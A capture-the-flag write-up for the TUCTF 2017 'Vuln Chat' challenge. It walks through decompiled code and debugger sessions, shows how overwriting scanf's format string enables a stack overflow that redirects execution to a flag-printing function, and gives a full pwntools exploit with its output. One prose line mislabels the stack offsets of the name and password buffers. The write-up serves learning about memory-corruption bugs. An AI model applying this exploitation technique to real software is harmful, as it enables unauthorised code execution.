
# Vuln Chat

`printFlag()` function at `0x0804856b` that uses `/bin/cat` to print the contents of `./flag.txt`.

```c
void printFlag(void)

{
  system("/bin/cat ./flag.txt");
  puts("Use it wisely");
  return;
}
```

The program takes two inputs, a `name` and some kind of `password`.

```c
undefined4 main(void)

{
  undefined1 password [20];
  undefined1 name [20];
  undefined4 format;
  undefined1 local_5;
  
  setvbuf(stdout,(char *)0,2,20);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  format = 0x73303325;
  local_5 = 0;
  __isoc99_scanf(&format,name);
  printf("Welcome %s!\n",name);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",name);
  __isoc99_scanf(&format,password);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
```

The `main` stack

```
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined1        Stack[-0x5]:1  local_5                                 XREF[1]:     080485c5(W)  
             undefined4        Stack[-0x9]:4  format                                  XREF[3]:     080485be(W), 
                                                                                                   080485cd(*), 
                                                                                                   08048630(*)  
             undefined1[20]    Stack[-0x1d]   name                                    XREF[3]:     080485c9(*), 
                                                                                                   080485d9(*), 
                                                                                                   0804861b(*)  
             undefined1[20]    Stack[-0x31]   password                                XREF[1]:     0804862c(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:08048487(*), 08048830, 
                                                                                          080488ac(*)  
        0804858a 55              PUSH       EBP
```

There is a **20** byte gap between the `name [-0x31]` input and the `format [-0x1d]` variable (the first argument of the first `scanf`).

```shell
python3

Python 3.12.3 (main, Feb  4 2025, 14:48:35) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x31 - 0x1d
20
```

Fill that with **20** bytes of `A`s + `%100s` to scan **100** bytes into the next buffer.

```
run < <(python3 -c 'import sys,pwn;sys.stdout.buffer.write(b"A"*20 + b"%100s")')
```

Break just under the 2nd `scanf` 

```
   0x08048634 <+170>:   call   0x8048460 <__isoc99_scanf@plt>
   0x08048639 <+175>:   add    esp,0x8
   0x0804863c <+178>:   push   0x80487ec
   0x08048641 <+183>:   call   0x8048410 <puts@plt>
   0x08048646 <+188>:   add    esp,0x4
   0x08048649 <+191>:   mov    eax,ds:0x8049a60
   0x0804864e <+196>:   push   eax
   0x0804864f <+197>:   call   0x80483f0 <fflush@plt>
   0x08048654 <+202>:   add    esp,0x4
   0x08048657 <+205>:   mov    eax,0x0
   0x0804865c <+210>:   leave
   0x0804865d <+211>:   ret
End of assembler dump.

pwndbg> b *(0x08048639)
Breakpoint 1 at 0x8048639
```

Running with the same payload again and hitting this breakpoint, we can see that the next address after the `%100s` is `0xffffceab`.

```
──────────────────────────────────────[ STACK ]───────────────────────────────────────
00:0000│ esp 0xffffcea0 —▸ 0xffffced3 ◂— '%100s'
01:0004│-034 0xffffcea4 —▸ 0xffffceab ◂— 0
02:0008│-030 0xffffcea8 ◂— 0
03:000c│-02c 0xffffceac ◂— 0
04:0010│-028 0xffffceb0 ◂— 0xffffffff
05:0014│-024 0xffffceb4 —▸ 0xf7d8496c ◂— 0x914
06:0018│-020 0xffffceb8 —▸ 0xf7fc1400 —▸ 0xf7d73000 ◂— 0x464c457f
07:001c│-01c 0xffffcebc ◂— 0x41000000
────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
 ► 0 0x8048639 main+175
   1 0xf7d97cb9 __libc_start_call_main+121
   2 0xf7d97d7c __libc_start_main+140
   3 0x8048491 _start+33
──────────────────────────────────────────────────────────────────────────────────────
pwndbg> i f
Stack level 0, frame at 0xffffcee0:
 eip = 0x8048639 in main; saved eip = 0xf7d97cb9
 called by frame at 0xffffcf40
 Arglist at 0xffffced8, args:
 Locals at 0xffffced8, Previous frame's sp is 0xffffcee0
 Saved registers:
  ebp at 0xffffced8, eip at 0xffffcedc
```

Which is **49** bytes away from the saved `$eip`. This means that we will have to add **49** bytes of padding to overflow it, and control program flow.

```shell
python3
Python 3.12.3 (main, Feb  4 2025, 14:48:35) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xffffceab - 0xffffcedc

-49
```

Putting this into a Python exploit

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'ERROR'

context.binary = elf = ELF("./vuln-chat", checksec=False)
p = process()

print(p.recvuntil("username: "))

name_payload = b"A"*20 + b"%100s"
p.sendline(name_payload)

print(p.recvuntil("you?"))

password_payload = b"B"*49 + p32(0x804856b)
p.sendline(password_payload)

p.interactive()
```

To get the flag.

```shell
python3 exploit.py
/home/wither/NOTES/TUCTF/2017/Vuln-Chat/exploit.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(p.recvuntil("username: "))
b'----------- Welcome to vuln-chat -------------\nEnter your username: '
/home/wither/NOTES/TUCTF/2017/Vuln-Chat/exploit.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(p.recvuntil("you?"))
b"Welcome AAAAAAAAAAAAAAAAAAAA%100s!\nConnecting to 'djinn'\n--- 'djinn' has joined your chat ---\ndjinn: I have the information. But how do I know I can trust you?"

AAAAAAAAAAAAAAAAAAAA%100s: djinn: Sorry. That's not good enough

flag{g0ttem_b0yz}
Use it wisely
$
```